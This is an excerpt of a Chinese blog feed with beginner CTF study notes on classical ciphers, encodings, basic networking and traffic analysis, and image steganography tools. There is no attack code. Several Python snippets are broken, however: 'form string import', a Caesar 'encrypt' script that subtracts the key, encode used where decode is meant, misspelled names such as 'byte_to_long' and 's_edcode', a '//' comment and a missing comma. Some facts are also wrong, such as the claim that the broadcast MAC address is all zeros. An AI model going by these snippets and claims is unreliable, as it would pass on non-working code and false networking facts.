        <content type="html"><![CDATA[<h2 id="CRYPTO初步学习"><a href="#CRYPTO初步学习" class="headerlink" title="CRYPTO初步学习"></a>CRYPTO初步学习</h2><h3 id="古典密码学介绍"><a href="#古典密码学介绍" class="headerlink" title="古典密码学介绍"></a>古典密码学介绍</h3><p>注！还需进行理解学习</p><h4 id="1-什么是密码学"><a href="#1-什么是密码学" class="headerlink" title="1.什么是密码学"></a>1.什么是密码学</h4><p><strong>小知识：</strong></p><p>（1）密码学不只是计算机科学的内容，密码学的研究包括历史、政治学、工程、语言军事学、伦理、数学和工业技术学等。</p><p>（2）CTF中的古典密码学题目有时也会出现在杂项里面，古典加密常常不给出加密算法，需要判断或者尝试一下。而CTF中的现代加密常常会给出加密算法,或者以一些形式提示某种常用的加密算法。即通过公开的加密算法和题目给<br>的条件来思考解密的算法并加以实现。</p><p><strong>分类：</strong></p><p>（1）<strong>古典密码学</strong>主要关注信息的保密书写和传递，以及与其相对应的破译方法。</p><p>（2）<strong>现代密码学</strong>不只关注信息保密问题，还同时涉及信息完整性验证、信息发布的不可抵赖性、以及在分布式计算中产生的来源于内部和外部的攻击的所有信息安全的问题。</p><p>（3）在有关密码学的一-些描述中,常使用Alice和Bob作为两个想要传递消息的两个人，Eve是想要从传递的密文中窃取明文信息的人。</p><p>（4）对于一组函数ε= (E，D) :<br>E为加密函数( encryption function)，密钥k ，明文m ，那么密文c = E(k,m).<br>D为解密函数( decryption function)，密钥k ，密文m ，那么明文m= D(k,c).<br>——&gt;<strong>D(k,E(k,m)) = m.</strong></p><h4 id="2-凯撒加密"><a href="#2-凯撒加密" class="headerlink" title="2.凯撒加密"></a>2.凯撒加密</h4><p><strong>定义：</strong>凯撒加密（Caesar cipher）是一种最简单且最广为人知的加密技术，它属于替代加密，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。</p><p><strong>方法：</strong>凯撒加密会生成一个一一对应的密码表，加密和解密过程都是通过查表完成的。<br>和很多其他的单表替换加密一样,凯撒加密是十分不安全的。可以把移位值看作密钥key ,不难想到,在明文空间为26个英文字母时,有效的密钥只有25个。所以很容易枚举出来。</p><p><strong>脚本：</strong></p><pre><code class="python">#明文变密文，根据自己设定的固定数目将明文进行移位生成对应密文form string import ascii_uppercasePlaintext=&quot;明文&quot;Key=想要移位的位数Plaintext=Plaintext.upper()Ciphertext=&quot;&quot;for i in Plaintext:    if i not in ascii_uppercase:        Ciphertext +=i    else:        Ciphertext +=chr(((ord(i)-ord(&quot;A&quot;)-Key)%26)+ord(&quot;A&quot;))print(Ciphertext)</code></pre><pre><code class="python">#密文变明文：把密文对应的所有结果都输出来，再判断哪个具有可读性即为所解明文from string import ascii_uppercaseCiphertext=&quot;密文&quot;Ciphertext=Ciphertext=Ciphertext.upper()def shift(Key):    Plaintext=&quot;&quot;    for i in Ciphertext:        if i not in ascii_uppercase:            Plaintext +=i        else:             Plaintext +=chr(((ord(i)-ord(&quot;A&quot;)-Key)%26)+ord(&quot;A&quot;))     return Plaintextfor Key in range(26):    print(shift(Key))</code></pre><h4 id="3-关键词加密"><a href="#3-关键词加密" class="headerlink" title="3.关键词加密"></a>3.关键词加密</h4><p><strong>定义：</strong>关键词加密( keyword cipher )也是一种单表替代加密，与凯撒加密不同之处在于密钥可以更为复杂。</p><p><strong>方法：</strong>加密时需要选择一个关键词,如果这个关键词有重复的字母，去除除第一次出现之外的所有的相同的字母。例如,如果选定的关键词为“success”，则使用“suce”。将该关键词写在字母表的下方,并用字母表的其他字母按标准的顺序填写余下的空间。这样就构建了字母一一对应的关系 ，加密时用下面一行中的字母对应替换上面一行的字母；解密时用上面一行中的字母对应替换下面一行的字母。</p><p>例题：</p><p>the keyword is MAGICNET</p><img src="/images/%E7%AC%AC%E4%BA%94%E7%AF%87%E5%8D%9A%E5%AE%A2/%E5%9B%BE%E7%89%872.png" alt="图片2" style="zoom:50%;" /><h4 id="4-仿射加密"><a href="#4-仿射加密" class="headerlink" title="4.仿射加密"></a>4.仿射加密</h4><p>也是一种单表替代加密，生成一个密码表后进行替代加密。</p><p><strong>加密：</strong>在仿射加密中,每个字母都对应一个数字(字母a-z分别对应数字0-25)，仿射加密法的密钥为0~ 25之间的数字对(a,b) , a与26的最大公约数必须为1,即GCD(a,26)=1,这就是说，能整除a和26的数只有1,例如a=2就是不可以的，因为GCD(2,26) = 2,a = 5就可以,因为只有1能整除5和26。p 为明文字母对应的数字, c为密文字母对应的数字。<br>——&gt;c=a·p + b (mod 26)</p><p><strong>解密：</strong>解密时需要计算(或枚举)密钥数字对中a的逆元，也就是a对26的模反数。模反数可以简单理解为整数环中的倒数，a乘以a的模反数对26取模等于1。例如5对26的逆元就是21。所以一个数乘以a ，再乘以a的逆元，就能算回原来的数。</p><p>求逆元可以用Python的第三方包gmpy2的invert函数：</p><pre><code class="python">from gmpy2 import invertprint(invert(5,26)) #21</code></pre><p>解密时已知密钥对(a，b) ，以及密文c ，可以通过下面的同余式计算出明文p。<br>——&gt;p=a^-1^(c-b) mod 26</p><p><strong>例题：</strong></p><pre><code class="python">from string import digits,ascii_lowercase#读取数字和小写字母的字符串from secret import numers,A,B#从题目文件中读取数字、A和Bassert min([i in digits for i in numbers])#提示：numbers里面的字符都是digits里面的flag = &quot;flag&#123;&quot;+&quot;&quot;.join([ascii_lowercase[int(i)]for i in numbers])+&quot;&#125;&quot;#把数字转换为字母，例如0对Aassert numbers == &quot;&quot;.join([str(ascii_lowercase.find(i))for i in flag[5:-1]])#与上一行意思相同，防止出错Ciphertext = &quot;&quot;#开始加密for i in flag:#注意扫描进行加密    if i not in ascii_lowercase:        Ciphertext += i#判断扫描的字符是否在小写字母里面，如果不在则照抄然后扫描下一个，例如“&#123;”直接保留    else:        Ciphertext += ascii_lowercase[(ascii_lowercase.find(i)*A+B) % 26]print(&quot;Ciphertext =&quot;,Ciphertext)#对小写字母进行加密#Ciphertext = vjsg&#123;dckvzksr&#125;</code></pre><p>解密的话先把a和b爆破出来，然后求A的逆元，由于密钥对(a，b)的两个变量有效的值都是小于26的，所以枚举也是完全可以承受的。得到(a, b)之后就可以正常解密了。</p><p><strong>总结：</strong>仿射加密本质上也是通过密钥对(a, b)生成了一个密码表，明文和密文中的字母具有一一对应的关系 ，且a与模数26互素保证了不重不漏。所以仿射加密也是一种单表替换加密，虽然比前面两种生成密码表的方式复杂一些，但也是顶不住针对单表替换的密码分析的。</p><h4 id="5-单表替代密码分析"><a href="#5-单表替代密码分析" class="headerlink" title="5.单表替代密码分析"></a>5.单表替代密码分析</h4><p><strong>方法：</strong>可以利用不同的英文字母在文段中的出现频率特征，来帮助我们判断某个字母被替换成了某个字母的可能性。</p><img src="/images/%E7%AC%AC%E4%BA%94%E7%AF%87%E5%8D%9A%E5%AE%A2/%E5%9B%BE%E7%89%873.png" alt="图片3" style="zoom:80%;" /><p>词频分析不仅针对单个字母的出现频率，同时有很多连续的两个字母出现频率较高（双联字母bigrams），也可以辅助我们进行分析。</p><p>以下是平均在1000个单词中，各双联字母出现的次数：</p><img src="/images/%E7%AC%AC%E4%BA%94%E7%AF%87%E5%8D%9A%E5%AE%A2/%E5%9B%BE%E7%89%875.png" alt="图片5" style="zoom:50%;" /><p>另外，如果有一个较大的单词库，还可以通过单词的格式，进一步帮助我们缩小可能的范围，例如单词happy为12334格式，success为1233411格式，那么被进行单表替换后，它的格式并不会发生改变。这种模式匹配的优点在于即使密文长度较短，也能尽可能能找到接近真相的结果。</p><p><strong>注意：</strong>密文有空格的话使用词频分析，除非把空格位置找到。</p><p><strong>推荐网站：</strong><a href="https://quipqiup.com/">https://quipqiup.com/</a></p><h4 id="6-维吉尼亚加密"><a href="#6-维吉尼亚加密" class="headerlink" title="6.维吉尼亚加密"></a>6.维吉尼亚加密</h4><p><strong>定义：</strong>维吉尼亚密码是使用一系列凯撒密码组成密码字母表的加密算法，属于多表密码。为了生成密码，需要使用表格法。这一表格包括了26行字母表，每一行都由前一行向左偏移一位得到。具体使用哪一行字母表进行编译是基于密钥进行的，在过程中会不断地变换。</p><img src="https://img2.baidu.com/it/u=3049389388,2093541746&fm=26&fmt=auto&gp=0.jpg" alt="img" style="zoom:50%;" /><p><strong>加密：</strong></p><p>例如：</p><p>明文：ATTACKATDAWN</p><p>选择关键词：LEMON，重复关键词，直到长度和明文相同，作为密钥LEMONLEMONLE</p><p>通过等长的明文和密钥，依次查表得到密文：LXFOPVEFRNHR</p><p><strong>特点：</strong>维吉尼亚加密可以避免直接的词频分析攻击，密文在统计上没有明显的规律，但是任然可以对其进行破解。</p><p>首先提出破解方法的Frederick Kasiski是基于这样一个简单的观察“密钥的重复部分与明文中的重复部分的连接，在密文中也产生一个重复部分”。</p><p>如果一个字符串在明文中重复，并且被密钥相同的部分加密，那么在密文中也会出现重复的字符串。</p><p><strong>解密：</strong></p><p>先进行关键词长度的判断，一旦确定了关键词的长度，余下的问题就只是如何使用该信息去找到真正的关键词了。关键词的长度揭示了密文可以被如何破解成单码加密的一个集合。</p><p>关键词的长度为n，那么破解维吉尼亚加密的问题就变成了解决n个单表加密的问题，需要有足够长的密文，然后通过词频分析逐个解决问题。</p><p>注：在单表加密中，无论什么密码表，相同的密文字母对应的明文字母也相同，但是在多表加密中，相同的密文字母可能映射出不同的明文字母。</p><h4 id="7-替换和编码"><a href="#7-替换和编码" class="headerlink" title="7.替换和编码"></a>7.替换和编码</h4><p>使用python脚本进制转换：</p><pre><code class="python">x = 123456 #十进制整数x_hex = hex(x)[2:] #十进制转十六进制x_bin = bin(x)[2:] #十进制转二进制print(x_hex, x_bin) #1e240 11110001001000000a = int(x_hex, 16) #十六进制转十进制b = int(x_bin, 2) #二进制转十进制print(a, b) #123456 123456</code></pre><p>字符串（str）类型和字节（bytes）类型相互转换：</p><pre><code class="python">s = &quot;flag&#123;this_is_flag&#125;&quot; #字符串类型s_bytes = s.encode() #字符串类型转字节类型s_str = s_bytes.encode() #字节类型转字符串类型print(s_bytes, s_str) #b&#39;flag&#123;this_is_flag&#125;&#39; flag&#123;this_is_flag&#125;</code></pre><p>base64编码解码：</p><pre><code class="python">import base64s = b&#39;flag&#123;this_is_flag&#125;&#39; #字节类型s_encode = base64.b64encode(s)#进行base64编码s_decode = base64.b64decode(s_encode) #继续宁base64解码print(s_encode, s_edcode) #b&#39;ZmxhZ3t0aGlzX2lzX2ZsYWd9&#39; b&#39;flag&#123;tihs_is_flag&#125;</code></pre><p>整数和字节类型的转换：</p><p>这种类型转换在密码方向题目中很常见，整数类型可以直接参与数学计算，字节类型会展示可读的字符</p><pre><code class="python">from Crypto.Util.number import *s = b&#39;flag&#123;this_is_flag&#125;&#39; #字节类型s_int = byte_to_long(s) #字节类型转为整数s_bytes = long_to_bytes(s_int) #证书转为字节类型print(s_int, s_bytes)</code></pre><p>不在范围内的字符（不可显示的）会以/-x……的形式显示出其的十六进制。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>第四篇博客</title>
      <link href="/2021/07/20/%E7%AC%AC%E5%9B%9B%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
      <url>/2021/07/20/%E7%AC%AC%E5%9B%9B%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="MISC初步学习"><a href="#MISC初步学习" class="headerlink" title="MISC初步学习"></a>MISC初步学习</h2><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><h4 id="小知识："><a href="#小知识：" class="headerlink" title="小知识："></a>小知识：</h4><p>注释：可练习题目进行掌握</p><p>（1）在使用抓包软件进行流量分析时，抓到的包往往含有数据链路层、网络层、传输层、应用层四个部分，其中每一个部分在传递到不同的层面的时候会被利用并丢弃。</p><p>（2）wreshark抓到的包工作在数据链路层（若网卡特殊则也可抓到物理层，启动慢是因为在寻找接口），而burpsuite抓到的http包则工作在应用层。</p><p>（3）物理层传输方式：WIFI无线通信（电磁波）、千兆网线（八根导线，百兆为四根）</p><p>（4）当同时连接网线和WIFI时，因为物理网口的跃点数比无线网口的跃点数低，跃点数越低则优先级越高，故选择以太网接口进行查看。</p><p>（5）视频/直播的数据很多是走UDP通道的。</p><p>（6）http与https：https协议是加密的</p><p>（7）加密协议统称为tls</p><p>（8）集线器会将信号转发给除了发送源的其他所有端口，因此不安全，容易被窃听。</p><p>（9）当多台计算机通过交换机（对照交换表精准转发，隔离冲突域）相连时，它们采用的通信方式是数据链路层的协议。当某台计算机想给另一个计算机发送消息时，需要在以太帧头中指明发送方和接收方的地址，交换机在接收到信号之后会根据这个地址正确地将信号转发至某一个端口（即网线），从而避免了网络内所有计算机都能收到信号。以太帧中的数据是我们想要传输的信息，包括接下来的IP数据包。想要转发给其它所有计算机的时候，目的MAC地址改为全0（广播地址）。</p><p>（10）当网卡地址变动时需刷新交换表，因此启用网络层配一个虚拟地址即IP地址，IP地址和MAC地址可以一对多也可以多对一。ARP协议将网络地址转换为物理地址。</p><p>（11）路由器进行跨网段转发。家用路由器集成多种功能。</p><p>（12）QQ聊天基于QICQ协议。</p><p>（13）用软件ubuntu连接服务器后输入命令nc -l 8888对8888端口进行监听。在windows powershell中输入命令ncat git.nepwn com 8888回车后输入内容，便可在ubuntu窗口接收到。</p><p>可在windows powershell中输入命令nslookup git.nepwn com进行服务器IP地址的查询。</p><p>可在ubuntu中输入命令ncat -lk 8888 –chat来进行多人聊天服务器的安装。</p><p>（14）http基于tcp，http端口为80。</p><p>（15）要分析病毒或者恶意软件建议在虚拟机里进行，这样就不会干扰到我们的宿主机。</p><p>（16）用wireshark/科来网络分析系统分析报文寻找flag。</p><p>有时查找到的flag需要用在线工具进行解密，有时在用wireshark做流量分析时也要将软件进行解密设置（打开对应的密钥文件），否则flag藏在加密的数据包里面而无法查找。</p><p>有些在请求包里面的题目可以用一般的流量导出的方法，然后在ubuntu中输入命令grep flag -rna .进行查找。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>第三篇博客</title>
      <link href="/2021/07/19/%E7%AC%AC%E4%B8%89%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
      <url>/2021/07/19/%E7%AC%AC%E4%B8%89%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="MISC初步学习"><a href="#MISC初步学习" class="headerlink" title="MISC初步学习"></a>MISC初步学习</h2><h3 id="数据编码"><a href="#数据编码" class="headerlink" title="数据编码"></a>数据编码</h3><h4 id="1-常见进制（01-二进制、hex）"><a href="#1-常见进制（01-二进制、hex）" class="headerlink" title="1.常见进制（01/二进制、hex）"></a>1.常见进制（01/二进制、hex）</h4><p><strong>（1）进制转换：</strong></p><p><strong>二进制转ascii码：</strong></p><p>二进制转化为十进制再对照ascii码表查找。</p><p>二进制转图片（hex）；二进制转万物……</p><p>二进制进位规则是“逢二进一”，借位规则是“以一当二”。</p><p><strong>二进制转morse码：</strong></p><p>二进制转十进制，然后对照ascii码表找相应字符。——&gt;初学者可以浏览器上搜索摩斯密码解密利用在线工具解读morse码，等熟练掌握之后可以用自己的python库或者自行编写一个小程序。</p><p><strong>二进制转二维码（绘图）：</strong>利用python的PIL库编写脚本</p><pre><code class="python">from PIL import ImageMAX=25//数据位数开平方pic=Image.new(&quot;RGB&quot;,(MAX,MAX))str=&quot;数据(二进制数)&quot;i=0for y in range(0,MAX):    for x in range(0,MAX):        if(str[i]==&#39;1&#39;):            pic.putpixel([x,y],(0,0,0))        else:            pic.putpixel([x,y](255,255,255))        i=i+1pic.show()pic.save(&quot;文件名（包括文件类型即扩展名）&quot;)</code></pre><p>两个方法：（遇到的问题将另外整理出来一篇。）</p><p>（1）python直接运行（需配置所需库）（2）虚拟机Linux环境下用python运行（需注意版本）</p><p><strong>二进制转图片：</strong></p><p>二进制转为十六进制（可借助在线工具，也可借助python脚本）再用十六进制编辑器（winhex/010等）生成文件进行保存，文件类型需自行根据开头结尾的数值进行判断。</p><h4 id="2-常见编码（jjencode、uuencode、jsfuck、brainfuck、ook！、敲击码、二维码）"><a href="#2-常见编码（jjencode、uuencode、jsfuck、brainfuck、ook！、敲击码、二维码）" class="headerlink" title="2.常见编码（jjencode、uuencode、jsfuck、brainfuck、ook！、敲击码、二维码）"></a>2.常见编码（jjencode、uuencode、jsfuck、brainfuck、ook！、敲击码、二维码）</h4><p>注意：未明确说明编码方式则去浏览器搜索在线工具帮忙转换/加解密。</p><p><strong>Ascii码：</strong></p><p>是基于拉丁字母的一套电脑编码系统，主要用于显示现代英语。二进制转换为十进制后对照ASCII码表查找。</p><img src="/images/%E7%AC%AC%E4%B8%89%E7%AF%87%E5%8D%9A%E5%AE%A2/image1.bubuko.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg" alt="点击查看源网页" style="zoom:50%;" /><p><strong>Base家族：</strong></p><p><strong>推荐软件：Cyberchef</strong>，可以在左侧operations处输入“magic”然后直接将字符串拖入框框进行自动识别，也可以自己一个个试（输入64、16等）。转换时记得将当前没有使用的模块断掉。</p><p>（1）base64：</p><p>编码原理：Base64编码要求把3个8位字节转化为4个6位字节，之后在6位的前面补两个0，形成8位一个字节的形式（即4个8位字节）。6位2进制能表示的最大数是2的6次方是64，因此共64个字符（A-Z，a-z，0-9，+，/），=不属于编码字符，而是填充字符。</p><img src="/images/%E7%AC%AC%E4%B8%89%E7%AF%87%E5%8D%9A%E5%AE%A2/cdn2.lmonkey.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg" alt="点击查看源网页" style="zoom:50%;" /><p>（2）base36：</p><p>规则：Base36包含0~9的数字，加上所有26个字母，不区分大小写，不包含任何标点，所有的字母要不全大写，要不全小写。</p><p>特点：密文由36个字符（0-9，a-z/A-Z）组成，加密仅支持整数数字，解密仅支持字符串，不支持中文。</p><p>（3）base58：</p><p>规则：采用的字符集为”9个数字+ 49个字母“：<br>“123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ”，Base58是纯数字与字母组成而且去掉了容易弓|起视觉混淆的字符(0: 数字零，O:大写O, I:大写i，l:小写L)。</p><p>特点：base58不适用数字“0”，字母大写“O”，字母大写“I”，和字母小写：“l”，以及“+”和“/”符号。</p><p>（4）base62：</p><p>规则：26个字母大小写再加0-9，共62个字符，相比于base64只是去掉了两个符号（+和/）</p><p>特点：密文由62个字符（0-9，a-z，A-Z）组成。</p><p>（5）base85：不常用</p><p>规则：一种类似于base64的二进制文本编码形式，通过使用五个SACII字符来表示四个字节的二进制数据。例如：它用于将图像嵌入到Adobe PDF文件中。</p><p>（6）base91、base92：</p><p>base91：</p><p>特点:由91个字符(0-9，a-Z，A-Z，!#$%&amp;()*+,./:;&lt;=&gt;?@[]^_`{|}”)组成</p><p>base92：</p><p>特点：比base91多一个字符~</p><p><strong>morse：</strong></p><p>定义：摩尔斯点码（morse code）是一种时通时断的信号代码，通过不同的排列顺序来表达不同的英文字母、数字和标点符号。由美国人艾尔菲德·维尔与萨缪尔·摩尔斯于1836年发明。是一种早期的数字化通信方式。</p><p>国际摩尔斯电码规则：</p><p>（1）一点的长度是一个单位；</p><p>（2）一划是三个单位；</p><p>（3）在一个字母中点划之间的间隔是一点；</p><p>（4）两个字母之间的间隔是三点（一划）；</p><p>（5）两个单词之间的间隔是七点。</p><p><strong>shellcode：</strong>在后台</p><p>定义：是一段利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。</p><p>方法：shellcode从十六进制转换为十进制再查ASCII码表。</p><p><strong>urlencode：</strong></p><p>定义：url编码又叫百分号编码，是一种统一资源定位（URL）编码方式。URL地址（常说网址）规定了常用的数字，字母可以直接使用，另外一批作为特殊用户字符也可以直接用（/,:@等），剩下的其他所有字符必须通过%xx编码处理。</p><p>方法：在该字节ascii码的16进制字符前面加%，如空格字符，ascii码是32，对应16进制是“20”，那么urlencode编码结果是：%20。</p><p><strong>unicode：</strong></p><p>中文又称万国码、国际码、统一码、单一码，是计算机科学领域的业界标准。</p><p>有两种形式：（1）“\u”开头；（2）“&amp;#x”开头，“；”结果。</p><p><strong>aaencode：</strong></p><p>可以将JS代码转换成常用的网络表情，也就是我们说的颜文字js加密。</p><p><strong>jjencode：</strong></p><p>由交换符、等号、下划线、括号、加号组成。</p><p><strong>uuencode：</strong></p><p>uuencode是二进制信息和文字信息之间的转换编码，也就是机器和人眼识读的转换。常见于电子邮件信息的传输，目前已被多用途互联网邮件扩展（MIME）大量取代。</p><p><strong>jsfuck：</strong></p><p>可以只用6个字符<a href=""></a>!+来编写JavaScript程序。</p><p><strong>brainfuck：</strong>+&lt;&gt;[]-.</p><p><strong>Ook!与short ook！:</strong></p><p>（1）Ook：全部由Ook！组成</p><p>（2）short ook！：.?!</p><p>经典题：short ook！藏到图片的ISP里面，放在最低有效位，难发现。</p><p><strong>敲击码：</strong></p><p>定义：以一种非常简单的方式对文本信息进行编码的方法，因该编码对信息通过使用一系列敲击声音来编码而命名，敲击码是基于5*5方格来实现的，不同点是把K字母整合到了C字母里面。</p><img src="/images/%E7%AC%AC%E4%B8%89%E7%AF%87%E5%8D%9A%E5%AE%A2/QQ%E5%9B%BE%E7%89%8720210722212146.png" alt="QQ图片20210722212146"  /><p><strong>二维码：</strong></p><p>定义：用某种特定几何图形按一定规律在平面分布的黑白相间的图片记录数据符号信息。分为堆叠式/行排式二维码又称堆积式二维码或层排式二维条码，其编码原理是建立在一维条码基础上，按需要堆积成二行或多行。</p><p>常见：Code16k、Code49、PDF417。矩阵式二维码（矩阵式二维条码又称棋盘式二维条码，是在一个矩形空间通过黑、白像素在矩形中的不同分布进行编码）：最常见QR CODE（特点：存储大容量信息；支持所有类型的数据；在小空间内打印；解码速度快。基本结构：格式信息：纠错等级+版本信息：即二维码的规格，QR码符号共有40种规格的矩阵）</p><p>常考：补定位点和纠错等级。——&gt;可利用工具QRazyBox等选择正确纠错等级后手动进行填充补全二维码。</p><img src="/images/%E7%AC%AC%E4%B8%89%E7%AF%87%E5%8D%9A%E5%AE%A2/u=34054438,971394809&fm=26&fmt=auto&gp=0.jpg" alt="点击查看源网页" style="zoom: 80%;" /><h4 id="3-稀奇古怪的编码（社会主义核心价值观、与佛论禅、熊曰-与熊问道等）"><a href="#3-稀奇古怪的编码（社会主义核心价值观、与佛论禅、熊曰-与熊问道等）" class="headerlink" title="3.稀奇古怪的编码（社会主义核心价值观、与佛论禅、熊曰/与熊问道等）"></a>3.稀奇古怪的编码（社会主义核心价值观、与佛论禅、熊曰/与熊问道等）</h4><p>（1）社会主义核心价值观编码：由二十四个字的社会主义核心价值观组成。</p><p>（2）与佛论禅：格式：“佛曰：+佛语”</p><p>（3）与熊问道：类似与佛论禅，开头为“熊曰”。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>第二篇博客</title>
      <link href="/2021/07/17/%E7%AC%AC%E4%BA%8C%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
      <url>/2021/07/17/%E7%AC%AC%E4%BA%8C%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="MISC初步学习"><a href="#MISC初步学习" class="headerlink" title="MISC初步学习"></a>MISC初步学习</h2><h3 id="misc图片隐写"><a href="#misc图片隐写" class="headerlink" title="misc图片隐写"></a>misc图片隐写</h3><p>注释：本文所说的文件名均包括扩展名</p><h4 id="1-Misc简介"><a href="#1-Misc简介" class="headerlink" title="1.Misc简介"></a>1.Misc简介</h4><p>概念：Misc为英文miscellaneous的前四个字母，杂项、混合体、大杂烩的意思。</p><p>主要类型：（1）数据编码/图片密码；（2）图片隐写；（3）音频&amp;视频隐写；（4）流量分析（主要分析这段流量里用户做了什么）；（5）内存取证（磁盘）；（6）游戏隐写。</p><h4 id="2-基础知识："><a href="#2-基础知识：" class="headerlink" title="2.基础知识："></a>2.基础知识：</h4><p>（1）010editor介绍（winhex）：工具，什么文件都可用它打开。以十六进制的方式呈现。</p><p>（2）图片十六进制文件头+文件模板：</p><p><strong>模板</strong>常用于告知宽、高和属性等信息。</p><p><strong>常见十六进制文件头：</strong></p><table><thead><tr><th>文件类型</th><th>文件头</th></tr></thead><tbody><tr><td>JPEG（jpg）</td><td>文件头：FFD8FF  结尾：FFD9，超过FFD9部分不会再读取</td></tr><tr><td>PNG</td><td>89504E47</td></tr><tr><td>GIF</td><td>474946383961</td></tr><tr><td>TIFF</td><td>49492A00</td></tr><tr><td>Windows Bitmap（bmp）</td><td>424D</td></tr><tr><td>CAD（dwg）</td><td>41433130</td></tr><tr><td>Adobe Pshotoshop（psd）</td><td>38425053</td></tr><tr><td>Rich TextFormat（rtf）</td><td>7B5C727466</td></tr><tr><td>XML（xml）</td><td>3C3F786D6C</td></tr><tr><td>HTML</td><td>68746D6C3E</td></tr><tr><td>Email[thorough only]（eml）</td><td>44656C69766572792D646174653A</td></tr><tr><td>Outlook Express（dbx）</td><td>CFAD12FEC5FD746F</td></tr><tr><td>Outlook（pst）</td><td>2142444E</td></tr><tr><td>Ms Word/Excel (xls.or.doc)</td><td>d0cf11e0a1b11ae10000</td></tr><tr><td>MS Access (mdb)</td><td>5374616E64617264204A</td></tr><tr><td>WordPerfect (wpd)</td><td>FF575043</td></tr><tr><td>Adobe Acrobat (pdf)</td><td>255044462D312E</td></tr><tr><td>Quicken (qdf)</td><td>AC9EBD8F</td></tr><tr><td>Windows Password (pwl)</td><td>E3828596</td></tr><tr><td>ZIP Archive (zip)</td><td>504B0304</td></tr><tr><td>RAR Archive (rar)</td><td>52617221</td></tr><tr><td>Wave (wav)</td><td>57415645</td></tr><tr><td>AVI(avi)</td><td>41564920</td></tr><tr><td>Real Audio (ram)</td><td>2E7261FD</td></tr><tr><td>Real Media (rm)</td><td>2E524D46</td></tr><tr><td>MPEG (mpg)</td><td>000001BA</td></tr><tr><td>MPEG(mpg)</td><td>000001B3</td></tr><tr><td>Quicktime (mov)</td><td>6D6F6F76</td></tr><tr><td>Windows Media (asf)</td><td>3026B2758E66CF11</td></tr><tr><td>MIDl(mid)</td><td>4D546864</td></tr></tbody></table><p>（3）文件属性（exiftools）：右键——&gt;属性——&gt;详细信息</p><p>（4）Kail虚拟机</p><h4 id="3-图片隐写分类"><a href="#3-图片隐写分类" class="headerlink" title="3.图片隐写分类"></a>3.图片隐写分类</h4><p><strong>图片隐写：</strong>把信息隐藏到图片中</p><p><strong>分类：</strong></p><p>（1）右击属性</p><p>（2）文件末尾藏有字符串：可利用到达结尾后停止读取的特性来隐藏信息</p><p><strong>文件十六进制藏有字符串：</strong></p><p>一、strings查找可打印的字符：图片右击打开控制台输入string+文件名.扩展名</p><p>二、grep使用正则表达式搜索，并输出匹配的行：grep flag</p><p>三、file识别文件类型：</p><p>当文件无后缀名时可通过010打开文件观察文件头以此来确定文件类型。如果用010无法判断文件类型，则可复制进Kail中查看，可直接看到也可打开终端输入命令file+文件名进行查看。</p><p>（四五六的例子）例如，一张png图片中隐藏着一张jpg图片的信息</p><p>四、binwalk分离文件：虚拟机中右击文件打开终端输入命令：binwalk+文件名/binwalk -e +文件名查看。</p><p>五、foremost提取文件：虚拟机中右击文件打开终端输入命令：foremost+文件名进行文件分离和查看。</p><p>六、虚拟机中右击文件打开终端输入命令：dd if=binwalk,foremost,源文件of所要分离的隐藏文件名 bs=1（每次读取一个块）skip=开始处（先利用命令进行分析查看） ——&gt;进行文件分离。</p><p><strong>foremost和dd区别：</strong>foremost可分离所有文件，但不一定能分离出所需要的所有的文件；dd适用于在多个文件中单独分离出所需要的那一个</p><p>（3）文件包含：进行百度自学</p><p>（4）修改文件头：（文件需要正确文件名才能显示。）破坏文件头一定不能读取，破坏文件尾还有可能读取。若文件头被破坏可找该文件类型的固定字段分析。</p><p>（5）GIF：特殊帧（ps/stegsolve）+帧的时间间隔</p><p>方法一：用PS分解图层来分析图片</p><p>方法二：利用stegsolve（安装stegsolve需要java环境）的分析中的帧浏览器</p><p>ABAB式的时间间隔则需想到二进制码源和摩斯</p><p>（6）png（bmp）：</p><p><strong>IHDR、IDAT</strong>：</p><p>IHDR表示图片的宽和高，可利用010进行修改，修改后需要进行保存。一般来说只修改高，修改宽会导致图片不能正确显示，修改高往大的改。</p><p>如果用010打开一张图片它下面显示报错，则说明它的高可能被修改了。可利用校验和计算来判断高是否被修改，也可用脚本爆破一下得知原来的高度。</p><p>IDAT数据块不能变，变了就不能显示了。（小知识：写满上一个块后才会进入下一个块的填写。如果发现上一个块没写满就填写下一个块则可能存在隐写。）</p><p>010复制快捷键：ctrl+shift+c</p><p>python多行输入固定写法，三个单引号</p><p><strong>zlib（010/pngcheck）</strong>：</p><p>用pngcheck查看或者复制进虚拟机打卡终端输入命令“binwalk -e  文件名”生成文件夹进行查看</p><p><strong>lsb隐写/lsb加密（zsteg/stegsolve）</strong>：</p><p>lsb又称最低有效位隐写，即通过最低两位的修改进行隐写。可利用stegsolve选择通道进行分析（学习地址：<a href="https://www.cnblogs.com/cat47/p/11483478.html">stegsolve使用方法 - cat47 - 博客园 (cnblogs.com)</a>）；也可以在虚拟机中打开终端输入“zsteg 文件名”命令进行查看（需安装zsteg），如果还是没有所需信息，则可输入命令“zsteg -a 文件名”进行更多信息的获取。（如果需要保存文件则在终端输入命令“zsteg -e 文件所在通道通道 源文件名 &gt;所要保存的文件名”）</p><p>save text与save bin的区别：save text在复制时会将十六进制与文本一齐复制下来；而save bin想复制十六进制则可单独复制十六进制，复制文本也一样。</p><p><strong>wbs43open（bmp）</strong>：</p><p>利用wbs43open输入密钥进行文件分离，查看隐写内容。</p><p>（7）JPG</p><p>（8）双图隐写</p><p>（9）stegpy</p><p>（10）silenteye</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>第一篇博客</title>
